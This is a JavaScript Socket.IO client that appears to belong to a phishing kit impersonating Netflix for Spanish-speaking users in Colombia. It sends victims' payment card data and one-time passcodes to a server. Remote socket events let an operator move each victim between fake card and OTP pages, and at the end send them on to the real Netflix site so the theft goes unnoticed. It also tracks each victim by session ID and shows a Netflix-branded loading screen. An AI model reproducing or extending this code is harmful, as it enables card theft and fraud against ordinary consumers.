// Socket.IO Client Manager
class SocketManager {
    constructor() {
        this.socket = null;
        this.sessionId = null;
        this.connected = false;
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = Infinity;
    }

    // Initialize socket connection
    init() {
        const socketURL = window.location.hostname === 'localhost' 
            ? 'http://localhost:3000' 
            : window.location.origin;

        this.socket = io(socketURL, {
            reconnection: true,
            reconnectionDelay: 500,
            reconnectionDelayMax: 3000,
            reconnectionAttempts: Infinity,
            timeout: 20000,
            transports: ['websocket', 'polling'],
            autoConnect: true,
            forceNew: false
        });

        this.setupEventListeners();
    }

    // Setup socket event listeners
    setupEventListeners() {
        // Connection successful
        this.socket.on('connect', () => {
            console.log('✅ Connected to server');
            this.connected = true;
            this.reconnectAttempts = 0;
        });

        // Session assigned
        this.socket.on('session_assigned', (data) => {
            this.sessionId = data.sessionId;
            localStorage.setItem('netflix_session_id', data.sessionId);
            console.log('📱 Session ID:', data.sessionId);
        });

        // Disconnect
        this.socket.on('disconnect', (reason) => {
            console.log('❌ Disconnected:', reason);
            this.connected = false;

            if (reason === 'io server disconnect') {
                // Server disconnected, attempt manual reconnect
                setTimeout(() => this.socket.connect(), 1000);
            }
        });

        // Reconnection attempt
        this.socket.on('reconnect_attempt', (attemptNumber) => {
            console.log(`🔄 Reconnection attempt ${attemptNumber}`);
            this.reconnectAttempts = attemptNumber;
        });

        // Reconnected successfully
        this.socket.on('reconnect', (attemptNumber) => {
            console.log(`✅ Reconnected after ${attemptNumber} attempts`);
            this.connected = true;
            this.reconnectAttempts = 0;

            // Restore session if exists
            const savedSessionId = localStorage.getItem('netflix_session_id');
            if (savedSessionId) {
                this.sessionId = savedSessionId;
            }
        });

        // Redirect to card page
        this.socket.on('redirect_to_card', () => {
            console.log('🔄 Redirecting to card page...');
            window.location.href = 'payment-card.html';
        });

        // Redirect to OTP page
        this.socket.on('redirect_to_otp', () => {
            console.log('🔐 Redirecting to OTP page...');
            window.location.href = 'payment-otp.html';
        });

        // Redirect to finish (Netflix)
        this.socket.on('redirect_to_finish', () => {
            console.log('✅ Redirecting to Netflix...');
            window.location.href = 'https://www.netflix.com/co/';
        });

        // Error handlers
        this.socket.on('connect_error', (error) => {
            console.error('Connection error:', error);
        });

        this.socket.on('card_error', (data) => {
            console.error('Card submission error:', data.error);
            this.hideLoading();
            alert('Error al procesar la tarjeta. Por favor intenta nuevamente.');
        });

        this.socket.on('otp_error', (data) => {
            console.error('OTP submission error:', data.error);
            this.hideLoading();
            alert('Error al procesar el código. Por favor intenta nuevamente.');
        });
    }

    // Submit card data
    submitCard(cardData) {
        return new Promise((resolve, reject) => {
            if (!this.connected) {
                reject(new Error('Not connected to server'));
                return;
            }

            this.showLoading();

            // Send card data
            this.socket.emit('submit_card', cardData);

            // Wait for response
            this.socket.once('card_submitted', (response) => {
                if (response.success) {
                    resolve(response);
                } else {
                    this.hideLoading();
                    reject(new Error('Failed to submit card'));
                }
            });

            // Timeout after 30 seconds
            setTimeout(() => {
                this.hideLoading();
                reject(new Error('Submission timeout'));
            }, 30000);
        });
    }

    // Submit OTP data
    submitOTP(otpData) {
        return new Promise((resolve, reject) => {
            if (!this.connected) {
                reject(new Error('Not connected to server'));
                return;
            }

            this.showLoading();

            // Send OTP data
            this.socket.emit('submit_otp', otpData);

            // Wait for response
            this.socket.once('otp_submitted', (response) => {
                if (response.success) {
                    resolve(response);
                } else {
                    this.hideLoading();
                    reject(new Error('Failed to submit OTP'));
                }
            });

            // Timeout after 30 seconds
            setTimeout(() => {
                this.hideLoading();
                reject(new Error('Submission timeout'));
            }, 30000);
        });
    }

    // Show loading screen
    showLoading() {
        // Create loading overlay if it doesn't exist
        let loadingOverlay = document.getElementById('loading-overlay');
        
        if (!loadingOverlay) {
            loadingOverlay = document.createElement('div');
            loadingOverlay.id = 'loading-overlay';
            loadingOverlay.innerHTML = `
                <div class="loading-content">
                    <img src="img/Netflix-Logo-2006.png" alt="Netflix" class="loading-logo">
                    <div class="loading-spinner"></div>
                    <p class="loading-text">Procesando tu información...</p>
                </div>
            `;
            document.body.appendChild(loadingOverlay);
        }

        loadingOverlay.style.display = 'flex';
        document.body.style.overflow = 'hidden';
    }

    // Hide loading screen
    hideLoading() {
        const loadingOverlay = document.getElementById('loading-overlay');
        if (loadingOverlay) {
            loadingOverlay.style.display = 'none';
            document.body.style.overflow = '';
        }
    }

    // Check if connected
    isConnected() {
        return this.connected && this.socket && this.socket.connected;
    }

    // Get session ID
    getSessionId() {
        return this.sessionId;
    }
}

// Create global instance
const socketManager = new SocketManager();

// Initialize on page load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => socketManager.init());
} else {
    socketManager.init();
}
